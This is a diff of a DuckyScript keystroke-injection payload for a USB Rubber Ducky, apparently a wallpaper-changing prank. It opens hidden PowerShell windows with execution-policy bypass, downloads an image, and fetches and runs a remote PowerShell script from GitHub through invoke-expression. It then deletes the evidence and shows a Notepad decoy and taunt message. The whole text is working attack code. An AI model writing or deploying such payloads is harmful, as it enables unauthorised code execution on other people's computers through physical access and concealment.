@@ -5,14 +5,30 @@ REM DESCRIPTION Program discretely changes wallpaper and deltes file before aler
 DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass Invoke-WebRequest -Uri https://i.imgur.com/53p0UMR.jpeg -OutFile waltpaper.jpeg
+STRING notepad.exe
 ENTER
-DELAY 5000
+DELAY 300
+GUI UPARROW
+DELAY 100
+STRING Please wait...
+ENTER
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 300
+STRING Invoke-WebRequest -Uri https://i.imgur.com/53p0UMR.jpeg -OutFile waltpaper.jpeg
+ENTER
+DELAY 100
+STRING exit
+ENTER
+DELAY 1000
 GUI r
 DELAY 300
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/LandonW385/rubberducky/main/waltpaper.ps1; invoke-expression $pl
 ENTER
-DELAY 3000
+DELAY 1000
 GUI r
 DELAY 300
 STRING powershell -w h -NoP -NonI -Exec Bypass Start-Sleep -Seconds 2; Remove-Item waltpaper.jpeg
@@ -20,13 +36,21 @@ ENTER
 DELAY 1000
 GUI r
 DELAY 500
-STRING notepad
+STRING taskkill /IM notepad.exe /F
 ENTER
-DELAY 1000
+DELAY 300
+GUI r
+DELAY 300
+STRING notepad.exe
+ENTER
+DELAY 300
 GUI UPARROW
+DELAY 300
+CTRL a
+DELAY 300
+BACKSPACE
 DELAY 300
 STRING Hello, hope you enjoy the new wallpaper!
 ENTER
-DELAY 300
+DELAY 100
 STRING ;)
-ENTER
